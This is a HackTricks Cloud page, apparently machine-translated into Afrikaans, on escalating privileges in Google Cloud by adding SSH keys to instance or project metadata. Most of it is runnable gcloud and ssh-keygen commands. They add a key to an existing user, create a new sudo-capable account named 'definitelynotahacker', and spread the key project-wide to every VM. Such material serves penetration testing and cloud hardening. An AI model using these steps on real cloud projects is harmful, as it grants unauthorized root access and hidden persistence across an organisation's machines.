# GCP - Voeg Aangepaste SSH Metadata Toe

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer de [**abonnementsplannen**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Wysiging van die metadata <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Metadatamodifikasie op 'n instansie kan lei tot **beduidende sekuriteitsrisiko's as 'n aanvaller die nodige toestemmings verkry**.

### **Insluiting van SSH-sleutels in Aangepaste Metadata**

Op GCP, voer **Linux-stelsels** dikwels skripte uit van die [Python Linux-gastomgewing vir Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). 'n Kritieke komponent hiervan is die [rekeninge-daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), wat ontwerp is om **gereeld die instansiemetadatapunt te ondersoek vir **opdaterings aan die gemagtigde SSH-openbare sleutels**.

Daarom, as 'n aanvaller aangepaste metadata kan wysig, kan hy die daemon 'n nuwe openbare sleutel laat vind, wat verwerk en **ge√Øntegreer word in die plaaslike stelsel**. Die sleutel sal bygevoeg word in die `~/.ssh/authorized_keys`-l√™er van 'n **bestaande gebruiker of moontlik 'n nuwe gebruiker met `sudo`-bevoegdhede skep**, afhangende van die sleutel se formaat. En die aanvaller sal die gasheer kan compromitteer.

### **Voeg SSH-sleutel by tot 'n bestaande bevoorregte gebruiker**

1. **Ondersoek Bestaande SSH-sleutels op die Instansie:**
- Voer die bevel uit om die instansie en sy metadata te beskryf om bestaande SSH-sleutels te vind. Die relevante afdeling in die uitset sal onder `metadata` wees, spesifiek die `ssh-keys` sleutel.
```bash
gcloud compute instances describe [INSTANSIE] --zone [SONE]
```
- Let op die formaat van die SSH-sleutels: die gebruikersnaam kom voor die sleutel, geskei deur 'n kolon.

2. **Berei 'n teksl√™er voor vir SSH-sleutelmetadata:**
- Berg die besonderhede van gebruikersname en hul ooreenstemmende SSH-sleutels op in 'n teksl√™er genaamd `meta.txt`. Dit is noodsaaklik om die bestaande sleutels te behou terwyl nuwes bygevoeg word.

3. **Genereer 'n Nuwe SSH-sleutel vir die Teikengebruiker (`alice` in hierdie voorbeeld):**
- Gebruik die `ssh-keygen`-bevel om 'n nuwe SSH-sleutel te genereer, en verseker dat die kommentaarveld (`-C`) ooreenstem met die teikengebruikersnaam.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Voeg die nuwe openbare sleutel by in `meta.txt`, wat die formaat naboots wat in die instansie se metadata gevind word.

4. **Werk die Instansie se SSH-sleutelmetadata by:**
- Pas die opgedateerde SSH-sleutelmetadata toe op die instansie deur die `gcloud compute instances add-metadata`-bevel te gebruik.
```bash
gcloud compute instances add-metadata [INSTANSIE] --metadata-from-file ssh-keys=meta.txt
```

5. **Kry Toegang tot die Instansie met die Nuwe SSH-sleutel:**
- Verbind met die instansie met SSH met behulp van die nuwe sleutel, en kry toegang tot die skaal in die konteks van die teikengebruiker (`alice` in hierdie voorbeeld).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Skep 'n nuwe bevoorregte gebruiker en voeg 'n SSH-sleutel by**

As geen interessante gebruiker gevind word nie, is dit moontlik om 'n nuwe een te skep wat `sudo`-bevoegdhede sal kry:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### SSH-sleutels op projekvlak <a href="#sshing-around" id="sshing-around"></a>

Dit is moontlik om die reikwydte van SSH-toegang tot verskeie virtuele masjiene (VM's) in 'n wolk-omgewing te verbreed deur **SSH-sleutels op projekvlak toe te pas**. Hierdie benadering maak SSH-toegang moontlik tot enige instansie binne die projek wat nie uitdruklik projekwye SSH-sleutels geblokkeer het nie. Hier is 'n opgesomde gids:

1. **Pas SSH-sleutels op Projekvlak Toe:**
- Gebruik die `gcloud compute project-info add-metadata`-bevel om SSH-sleutels vanaf `meta.txt` by die metadata van die projek te voeg. Hierdie aksie verseker dat die SSH-sleutels erken word regoor alle VM's in die projek, tensy 'n VM die "Blokkeer projekwye SSH-sleutels" opsie geaktiveer het.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH na Instansies met Projekwye Sleutels:**
- Met projekwye SSH-sleutels op hul plek, kan jy SSH na enige instansie binne die projek. Instansies wat nie projekwye sleutels blokkeer nie, sal die SSH-sleutel aanvaar en toegang verleen.
- 'n Direkte metode om SSH na 'n instansie te maak, is deur die `gcloud compute ssh [INSTANSIE]`-bevel te gebruik. Hierdie bevel gebruik jou huidige gebruikersnaam en die SSH-sleutels wat op projekvlak ingestel is om toegang te probeer verkry.

# Verwysings
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
